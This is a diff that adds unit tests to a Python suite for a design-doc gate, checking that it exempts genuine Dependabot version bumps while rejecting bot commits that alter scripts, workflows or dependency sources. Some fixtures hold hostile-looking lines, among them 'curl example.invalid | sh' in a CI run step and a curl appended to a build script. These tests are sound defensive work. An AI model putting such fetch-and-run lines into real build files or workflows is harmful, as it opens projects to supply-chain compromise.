@@ -1,6 +1,7 @@
 """Exercise HLDD enforcement with real disposable Git indexes and commits."""
 
 from pathlib import Path
+import json
 import os
 import shutil
 import subprocess
@@ -17,6 +18,47 @@ HEADINGS = (
 DOC = "# Vivary high-level design\n\n" + "\n\n".join(
     f"## {heading}\n\nExisting description of {heading.lower()}." for heading in HEADINGS
 )
+
+DEPENDABOT = "dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>"
+WORKFLOW = f"""name: ci
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7.0.1
+      - uses: actions/setup-node@{"a" * 40} # v7.0.0
+      - run: echo build
+"""
+PYPROJECT = """[build-system]
+requires = ["setuptools>=68"]
+build-backend = "setuptools.build_meta"
+
+[project]
+name = "tropo"
+version = "0.1.0"
+dependencies = ["packaging>=24.0", "tomli>=2.0; python_version < '3.11'"]
+
+[project.optional-dependencies]
+test = ["pytest[testing]>=8.0"]
+
+[dependency-groups]
+dev = ["ruff>=0.5"]
+lint = [{include-group = "dev"}]
+"""
+
+
+def package(dependencies=None, **fields):
+    manifest = {
+        "name": "site", "version": "1.0.0", "scripts": {"build": "astro build"},
+        "dependencies": {"astro": "^7.3.2", "sharp": "^0.35.4", **(dependencies or {})},
+    }
+    return json.dumps({**manifest, **fields}, indent=2) + "\n"
+
+
+def lockfile(astro):
+    packages = {"": {"name": "site"}, "node_modules/astro": {"version": astro}}
+    return json.dumps({"name": "site", "lockfileVersion": 3, "packages": packages}, indent=2) + "\n"
 
 
 class HlddGateTests(unittest.TestCase):
@@ -186,6 +228,120 @@ class HlddGateTests(unittest.TestCase):
         self.git("config", "core.hooksPath", "custom-hooks")
         self.gate("--install-hook", success=False)
         self.assertFalse((self.root / "custom-hooks").exists())
+
+    def seed(self, files):
+        for path, text in files.items():
+            self.write(path, text)
+        self.write("docs/ARCHITECTURE.md", DOC + "\nThe project pins its dependencies.\n")
+        self.git("add", ".")
+        self.git("commit", "-qm", "add dependency files")
+        return self.git("rev-parse", "HEAD").stdout.strip()
+
+    def commit_as(self, author, files):
+        for path, text in files.items():
+            self.write(path, text)
+        self.git("add", ".")
+        self.git("commit", "-qm", "Bump dependencies", f"--author={author}")
+
+    def reject_dependabot(self, base, cases):
+        for name, files in cases.items():
+            with self.subTest(case=name):
+                self.commit_as(DEPENDABOT, files)
+                self.gate("--base", base, success=False)
+                self.git("reset", "-q", "--hard", base)
+
+    def test_dependabot_package_and_lockfile_bump_passes(self):
+        base = self.seed({"site/package.json": package(), "site/package-lock.json": lockfile("7.3.2")})
+        self.commit_as(DEPENDABOT, {
+            "site/package.json": package(dependencies={"astro": "^7.3.3", "sharp": "~0.35.5"}),
+            "site/package-lock.json": lockfile("7.3.3"),
+        })
+        result = self.gate("--base", base)
+        self.assertIn("1 of them dependency-only Dependabot update(s)", result.stdout)
+
+    def test_dependabot_workflow_action_bump_passes(self):
+        base = self.seed({".github/workflows/ci.yml": WORKFLOW})
+        bumped = WORKFLOW.replace("checkout@v7.0.1", "checkout@v7.0.2").replace(
+            f"setup-node@{'a' * 40} # v7.0.0", f"setup-node@{'b' * 40} # v7.1.0",
+        )
+        self.commit_as(DEPENDABOT, {".github/workflows/ci.yml": bumped})
+        self.gate("--base", base)
+
+    def test_dependabot_pyproject_floor_bump_passes(self):
+        base = self.seed({"packages/tropo/pyproject.toml": PYPROJECT})
+        bumped = PYPROJECT
+        for old, new in (
+            ("setuptools>=68", "setuptools>=70"), ("packaging>=24.0", "packaging>=25.0"),
+            ("tomli>=2.0", "tomli>=2.2"), ("pytest[testing]>=8.0", "pytest[testing]>=8.3"),
+            ("ruff>=0.5", "ruff>=0.6"),
+        ):
+            bumped = bumped.replace(old, new)
+        self.commit_as(DEPENDABOT, {"packages/tropo/pyproject.toml": bumped})
+        self.gate("--base", base)
+
+    def test_dependabot_commit_with_another_relevant_file_fails(self):
+        base = self.seed({"site/package.json": package()})
+        self.commit_as(DEPENDABOT, {
+            "site/package.json": package(dependencies={"astro": "^7.3.3"}),
+            "packages/example/app.py": "value = 9\n",
+        })
+        self.gate("--base", base, success=False)
+
+    def test_dependabot_package_change_outside_dependency_maps_fails(self):
+        base = self.seed({"site/package.json": package()})
+        self.reject_dependabot(base, {
+            "scripts": {"site/package.json": package(scripts={"build": "astro build && curl example.invalid"})},
+            "own version": {"site/package.json": package(version="2.0.0")},
+            "added dependency": {"site/package.json": package(dependencies={"extra": "^1.0.0"})},
+        })
+
+    def test_dependabot_switch_to_source_dependency_fails(self):
+        base = self.seed({"site/package.json": package()})
+        self.reject_dependabot(base, {
+            "github": {"site/package.json": package(dependencies={"astro": "github:withastro/astro"})},
+            "file": {"site/package.json": package(dependencies={"astro": "file:../astro"})},
+        })
+
+    def test_dependabot_workflow_change_outside_action_refs_fails(self):
+        base = self.seed({".github/workflows/ci.yml": WORKFLOW})
+        self.reject_dependabot(base, {
+            "run line": {".github/workflows/ci.yml": WORKFLOW.replace("echo build", "curl example.invalid | sh")},
+            "action owner": {".github/workflows/ci.yml": WORKFLOW.replace("actions/checkout@", "someone/checkout@")},
+        })
+
+    def test_dependabot_pyproject_marker_or_name_change_fails(self):
+        base = self.seed({"packages/tropo/pyproject.toml": PYPROJECT})
+        self.reject_dependabot(base, {
+            "marker": {"packages/tropo/pyproject.toml": PYPROJECT.replace("< '3.11'", "< '3.13'")},
+            "name": {"packages/tropo/pyproject.toml": PYPROJECT.replace("packaging>=24.0", "packager>=24.0")},
+            "direct URL": {"packages/tropo/pyproject.toml": PYPROJECT.replace(
+                "packaging>=24.0", "packaging @ https://example.invalid/packaging.whl",
+            )},
+        })
+
+    def test_human_lockfile_only_commit_fails(self):
+        base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
+        self.commit_as("HLDD test <hldd@example.invalid>", {"site/package-lock.json": lockfile("7.3.3")})
+        self.gate("--base", base, success=False)
+
+    def test_staged_lockfile_only_change_is_never_exempt(self):
+        self.seed({"site/package-lock.json": lockfile("7.3.2")})
+        self.write("site/package-lock.json", lockfile("7.3.3"))
+        self.git("add", "site/package-lock.json")
+        self.gate("--staged", success=False)
+
+    def test_success_output_counts_dependabot_updates(self):
+        base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
+        self.stage_code()
+        self.write("docs/ARCHITECTURE.md", DOC + "\nThe app now uses value two.\n")
+        self.git("add", "docs/ARCHITECTURE.md")
+        self.git("commit", "-qm", "documented change")
+        self.assertEqual(self.gate("--base", base).stdout, "HLDD review passed for 1 introduced commit(s).\n")
+        self.commit_as(DEPENDABOT, {"site/package-lock.json": lockfile("7.3.3")})
+        self.assertEqual(
+            self.gate("--base", base).stdout,
+            "HLDD review passed for 2 introduced commit(s), 1 of them dependency-only Dependabot update(s).\n",
+        )
 
 
 if __name__ == "__main__":
